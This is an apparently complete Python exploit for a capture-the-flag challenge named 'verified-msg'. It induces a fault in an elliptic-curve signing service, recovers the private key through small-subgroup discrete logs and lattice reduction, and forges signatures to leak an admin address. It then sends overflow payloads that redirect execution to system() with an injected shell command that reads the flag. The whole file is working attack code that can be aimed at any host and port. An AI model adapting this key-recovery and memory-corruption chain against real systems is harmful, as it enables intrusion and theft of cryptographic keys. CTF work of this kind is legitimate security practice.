#!/usr/bin/env python3
import hashlib
import math
import os
import random
import re
import socket
import struct
import subprocess
import sys
from dataclasses import dataclass

import gmpy2
from sympy.polys.domains import ZZ as SYMPY_ZZ
from sympy.polys.matrices import DomainMatrix

try:
    from fpylll import CVP, IntegerMatrix, LLL
except ImportError:
    CVP = IntegerMatrix = LLL = None


P = int("ffffffff00000001000000000000000000000000ffffffffffffffffffffffff", 16)
A = int("ffffffff00000001000000000000000000000000fffffffffffffffffffffffc", 16)
B = int("8a4d412a0d8300d7a1e9eb5132d3053f114d9be33338726be29a010c5d80bad6", 16)
N = int("48757cec19c4ef9ee451a30356c4e4985efb0b7bea2838e573bf5fc3", 16)
Gx = int("5b741d2fdb5e84a9c7296ab00dd6f9793b612755ef7951bd0469f3eba390ef9a", 16)
Gy = int("c552e632e0700ed72c863fd2e5189c15e31eed4a7c160537b6d11b95db3d2414", 16)

SMALL_H = 15174272033
PROMPT = b"1: sign, 2: verify: "
MAX_MSG = 0x8000
P1_OFF = 0x10298
ADMIN_OFF = 0x24F0
SYSTEM_OFF = 0x11F0
BUFFER_OFF = 0x92E8


def sha256_u256(msg: bytes) -> int:
    return int.from_bytes(hashlib.sha256(msg).digest(), "little") % N


def enc_u256(x: int) -> bytes:
    return int(x).to_bytes(32, "little")


def inv(x: int, mod: int) -> int:
    return int(gmpy2.invert(x % mod, mod))


@dataclass(frozen=True)
class Point:
    x: int = 0
    y: int = 0
    inf: bool = True


INF = Point()


def point_neg(pt: Point) -> Point:
    if pt.inf:
        return pt
    return Point(pt.x, 0 if pt.y == 0 else P - pt.y, False)


def point_add(p1: Point, p2: Point) -> Point:
    if p1.inf:
        return p2
    if p2.inf:
        return p1
    if p1.x == p2.x and (p1.y + p2.y) % P == 0:
        return INF
    if p1.x == p2.x and p1.y == p2.y:
        if p1.y == 0:
            return INF
        lam = ((3 * p1.x * p1.x + A) * inv((2 * p1.y) % P, P)) % P
    else:
        lam = ((p2.y - p1.y) * inv((p2.x - p1.x) % P, P)) % P
    x3 = (lam * lam - p1.x - p2.x) % P
    y3 = (lam * (p1.x - x3) - p1.y) % P
    return Point(x3, y3, False)


def scalar_mult(k: int, pt: Point) -> Point:
    res = INF
    cur = pt
    kk = int(k)
    while kk:
        if kk & 1:
            res = point_add(res, cur)
        cur = point_add(cur, cur)
        kk >>= 1
    return res


def decompress(x: int, y_parity: int) -> Point:
    rhs = (pow(x, 3, P) + (A * x) + B) % P
    y = pow(rhs, (P + 1) // 4, P)
    if (y & 1) != y_parity:
        y = (-y) % P
    return Point(x, y, False)


def lll_reduce(rows: list[list[int]]) -> list[list[int]]:
    dm = DomainMatrix(rows, (len(rows), len(rows[0])), SYMPY_ZZ)
    reduced = dm.lll().to_Matrix().tolist()
    return [[int(val) for val in row] for row in reduced]


def dot(v1, v2):
    return sum(a * b for a, b in zip(v1, v2))


def babai_closest(rows: list[list[int]], target: list[int]) -> list[int]:
    if IntegerMatrix is not None:
        matrix = IntegerMatrix.from_matrix(rows)
        LLL.reduction(matrix)
        return list(CVP.closest_vector(matrix, tuple(target)))
    red = lll_reduce(rows)
    with gmpy2.local_context(gmpy2.context(), precision=512):
        rows_f = [[gmpy2.mpfr(x) for x in row] for row in red]
        ortho = []
        for i, row in enumerate(rows_f):
            cur = row[:]
            for j in range(i):
                mu = dot(row, ortho[j]) / dot(ortho[j], ortho[j])
                cur = [c - mu * b for c, b in zip(cur, ortho[j])]
            ortho.append(cur)
        coeffs = [0] * len(red)
        rem = [gmpy2.mpfr(x) for x in target]
        for i in reversed(range(len(red))):
            coeff = int(round(dot(rem, ortho[i]) / dot(ortho[i], ortho[i])))
            coeffs[i] = coeff
            rem = [r - coeff * b for r, b in zip(rem, rows_f[i])]
    acc = [0] * len(red[0])
    for coeff, row in zip(coeffs, red):
        for idx, value in enumerate(row):
            acc[idx] += coeff * value
    return acc


class Tube:
    def __init__(self, proc=None, sock=None):
        self.proc = proc
        self.sock = sock
        self.buf = bytearray()

    @classmethod
    def local(cls, path: str):
        proc = subprocess.Popen(
            [path],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
        )
        return cls(proc=proc)

    @classmethod
    def remote(cls, host: str, port: int):
        sock = socket.create_connection((host, port))
        sock.settimeout(120)
        return cls(sock=sock)

    def close(self):
        if self.sock is not None:
            self.sock.close()
        if self.proc is not None:
            self.proc.kill()

    def _read_some(self) -> bytes:
        if self.sock is not None:
            data = self.sock.recv(4096)
        else:
            data = os.read(self.proc.stdout.fileno(), 4096)
        if not data:
            raise EOFError(bytes(self.buf))
        return data

    def recv_until(self, needle: bytes) -> bytes:
        while needle not in self.buf:
            self.buf.extend(self._read_some())
        idx = self.buf.index(needle) + len(needle)
        out = bytes(self.buf[:idx])
        del self.buf[:idx]
        return out

    def recv_exact(self, n: int) -> bytes:
        while len(self.buf) < n:
            self.buf.extend(self._read_some())
        out = bytes(self.buf[:n])
        del self.buf[:n]
        return out

    def recv_line(self) -> bytes:
        return self.recv_until(b"\n")

    def send(self, data: bytes):
        if self.sock is not None:
            self.sock.sendall(data)
        else:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()

    def send_line(self, data: bytes):
        self.send(data + b"\n")


class Exploit:
    def __init__(self, tube: Tube):
        self.tube = tube
        self.have_prompt = False
        self.base_faulted = decompress(Gx + 1, Gy & 1)
        self.torsion = scalar_mult(N, self.base_faulted)
        self.bsgs_m = math.isqrt(SMALL_H) + 1
        print("[*] building torsion table", flush=True)
        self.baby = self._build_bsgs()

    def _build_bsgs(self):
        table = {}
        cur = INF
        for j in range(self.bsgs_m):
            table[cur] = j
            cur = point_add(cur, self.torsion)
        self.giant = scalar_mult(self.bsgs_m, point_neg(self.torsion))
        return table

    def dlog_torsion(self, pt: Point) -> int:
        cur = pt
        for i in range(self.bsgs_m + 1):
            if cur in self.baby:
                return (i * self.bsgs_m + self.baby[cur]) % SMALL_H
            cur = point_add(cur, self.giant)
        raise ValueError("dlog failure")

    def ensure_prompt(self):
        if not self.have_prompt:
            self.tube.recv_until(PROMPT)
            self.have_prompt = True

    def sign(self, msg: bytes):
        self.ensure_prompt()
        self.have_prompt = False
        self.tube.send_line(b"1")
        self.tube.recv_until(b"msg_len: ")
        self.tube.send_line(str(len(msg)).encode())
        self.tube.send(msg)
        blob = self.tube.recv_exact(len(msg) + 64)
        self.tube.recv_until(PROMPT)
        self.have_prompt = True
        s = int.from_bytes(blob[len(msg) : len(msg) + 32], "little")
        rx = int.from_bytes(blob[len(msg) + 32 : len(msg) + 64], "little")
        return s, rx

    def sign_truncated(self, msg: bytes):
        self.ensure_prompt()
        self.have_prompt = False
        self.tube.send_line(b"1")
        self.tube.recv_until(b"msg_len: ")
        self.tube.send_line(str(len(msg)).encode())
        self.tube.send(msg)
        blob = self.tube.recv_exact(MAX_MSG)
        self.tube.recv_until(PROMPT)
        self.have_prompt = True
        return blob

    def verify(self, msg: bytes, s: int, rx: int) -> bytes:
        self.ensure_prompt()
        self.have_prompt = False
        self.tube.send_line(b"2")
        self.tube.recv_until(b"msg_len: ")
        self.tube.send_line(str(len(msg)).encode())
        self.tube.send(msg)
        self.tube.send(enc_u256(s))
        self.tube.send(enc_u256(rx))
        resp = self.tube.recv_until(PROMPT)
        self.have_prompt = True
        return resp

    def trigger_fault(self):
        msg = b""
        h = sha256_u256(msg)
        u1 = 0x8000
        s = (h * inv(u1, N)) % N
        self.verify(msg, s, 1)

    def residue_candidates(self, rx: int):
        lifted = decompress(rx, 0)
        torsion_pt = scalar_mult(N, lifted)
        a = self.dlog_torsion(torsion_pt)
        return [a, (-a) % SMALL_H]

    def recover_key(self, samples):
        def solve(choice_bits):
            basis = [[0] * (len(samples) + 1) for _ in range(len(samples) + 1)]
            target = [0] * (len(samples) + 1)
            for i in range(len(samples)):
                basis[i][i] = SMALL_H * N
            for i, sample in enumerate(samples):
                a = sample["residues"][(choice_bits >> i) & 1]
                denom = (sample["s"] * SMALL_H) % N
                inv_denom = inv(denom, N)
                t = (sample["r"] * inv_denom) % N
                u = ((sample["s"] * a - sample["e"]) * inv_denom) % N
                basis[len(samples)][i] = SMALL_H * t
                target[i] = SMALL_H * u
            basis[len(samples)][len(samples)] = 1
            vec = babai_closest(basis, target)
            return vec[-1] % N

        for choice_bits in range(1 << len(samples)):
            d = solve(choice_bits)
            if self.check_candidate(d, samples):
                return d
        raise RuntimeError("private key recovery failed")

    def check_candidate(self, d: int, samples) -> bool:
        for sample in samples[:2]:
            k = ((sample["e"] + sample["r"] * d) * inv(sample["s"], N)) % N
            if scalar_mult(k, self.base_faulted).x != sample["rx_full"]:
                return False
        return True

    def check_key(self, d: int) -> bool:
        msg = b"probe"
        e = sha256_u256(msg)
        k = 1
        rx = Gx
        s = (e + (rx % N) * d) % N
        if s == 0:
            return False
        resp = self.verify(msg, s, rx)
        return b"verified!\n" in resp

    def forge(self, d: int, msg: bytes, k: int = 1):
        pt = scalar_mult(k, Point(Gx, Gy, False))
        rx = pt.x
        s = (inv(k, N) * (sha256_u256(msg) + (rx % N) * d)) % N
        if s == 0:
            raise ValueError("bad nonce")
        return s, rx

    def leak_admin(self, d: int) -> int:
        gift_msg = b"give me the gift"
        s_gift, r_gift = self.forge(d, gift_msg)
        gift_resp = self.verify(gift_msg, s_gift, r_gift)
        print(gift_resp.decode("latin-1", errors="replace"))
        match = re.search(rb"gift:\s*([0-9a-fA-F]+)", gift_resp)
        if match is None:
            raise RuntimeError("failed to leak admin address")
        return int(match.group(1), 16)

    def pwn(self, admin_addr: int, local: bool, max_loops: int = 5000):
        pie_base = admin_addr - ADMIN_OFF
        p1_abs = pie_base + P1_OFF
        p2_abs = pie_base + BUFFER_OFF + 1
        system_abs = pie_base + SYSTEM_OFF
        shell = b"echo PWNED" if local else b"cat /flag*"

        stage_a = bytearray(b"A" * 0x7FD9)
        for shift in range(39):
            stage_a[0x6FB0 - shift] = 0
        stage_a[0x7FB0:0x7FB8] = struct.pack("<Q", p1_abs)

        stage_b = bytearray(b"A" * 0x7FD9)
        stage_b[0x6FB0] = 0
        stage_b[0x7FB0:0x7FD0] = struct.pack("<Q", p2_abs) + struct.pack("<Q", system_abs) + (b"B" * 16)
        stage_b[0x7FD0] = 0

        stage_c = bytearray(b"Z" * 0x1072)
        cmd = b"i'm admin';" + shell + b";#\x00"
        stage_c[: len(cmd)] = cmd
        stage_c[0x1051:0x1071] = b"\x00" * 32
        stage_c[0x1071] = 0

        stage_a_hash = sha256_u256(bytes(stage_a))
        stage_b_hash = sha256_u256(bytes(stage_b))
        stage_c_hash = sha256_u256(bytes(stage_c))
        sign_msg = b"A" * 0x7FC2
        success_marker = b"PWNED" if local else b"tkbctf{"

        for attempt in range(1, max_loops + 1):
            if attempt == 1 or attempt % 50 == 0:
                print(f"[*] pwn loop {attempt}", flush=True)
            self.sign_truncated(sign_msg)
            self.verify(bytes(stage_a), stage_a_hash, 0)
            self.verify(bytes(stage_b), stage_b_hash, 0)
            final_resp = self.verify(bytes(stage_c), stage_c_hash, 0)
            if success_marker in final_resp:
                print(final_resp.decode("latin-1", errors="replace"))
                return
        raise RuntimeError("pwn loop exhausted without success")


def main():
    local = len(sys.argv) >= 2 and sys.argv[1] == "--local"
    if local:
        tube = Tube.local("./_src/verified-msg/chall")
    elif len(sys.argv) >= 3:
        tube = Tube.remote(sys.argv[1], int(sys.argv[2]))
    else:
        print(f"usage: {sys.argv[0]} --local | HOST PORT", file=sys.stderr)
        sys.exit(1)

    exp = Exploit(tube)
    try:
        samples = []
        print("[*] triggering fault", flush=True)
        exp.trigger_fault()
        for i in range(8):
            msg = f"msg-{i:02d}-{random.getrandbits(32):08x}".encode()
            print(f"[*] collecting sample {i}", flush=True)
            s, rx = exp.sign(msg)
            samples.append(
                {
                    "msg": msg,
                    "e": sha256_u256(msg),
                    "s": s,
                    "r": rx % N,
                    "rx_full": rx,
                    "residues": exp.residue_candidates(rx),
                }
            )
        print("[*] recovering private key", flush=True)
        d = exp.recover_key(samples)
        print(f"[+] private key = {d:#x}")
        admin_addr = exp.leak_admin(d)
        print(f"[+] admin = {admin_addr:#x}", flush=True)
        max_loops = int(os.environ.get("PWN_MAX_LOOPS", "5000"))
        exp.pwn(admin_addr, local=local, max_loops=max_loops)
    finally:
        tube.close()


if __name__ == "__main__":
    main()
